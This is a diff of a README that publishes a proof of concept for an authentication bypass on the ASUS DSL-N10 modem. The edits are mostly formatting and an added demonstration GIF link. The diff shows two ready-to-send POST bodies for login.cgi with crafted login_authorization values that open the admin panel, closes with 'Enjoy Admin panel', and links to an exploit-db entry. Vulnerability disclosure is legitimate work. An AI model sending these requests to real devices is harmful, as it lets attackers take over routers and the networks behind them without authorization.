@@ -16,13 +16,14 @@ or data of another device to access admin panel.
 ## 2. Proof of Concept:
 Browse http://< Your Modem IP >/login.cgi
  
-Send this post data:  
+**Send this post data:**  
 group_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&next_page=%2Fcgi-bin%2FAdvanced_LAN_Content.asp&login_authorization=YWRtaW46MQ%3D%2D
  
-Or this post data:  
+**Or this post data:**    
 group_id=&action_mode=&action_script=&action_wait=5&current_page=Main_Login.asp&next_page=%2Fcgi-bin%2FAdvanced_LAN_Content.asp&login_authorization=FWRtaW46MQ%3D5D
 
-Enjoy Admin panel
+![Alt text](https://github.com/AmnBAN/ASUS-DSL-N10-Authentication-Bypass/raw/master/asus-dsl-n10-c1-admin-panel-authentication-bypass.gif)  
+**Enjoy Admin panel**  
 
 ## links:
 https://www.exploit-db.com/exploits/45201/
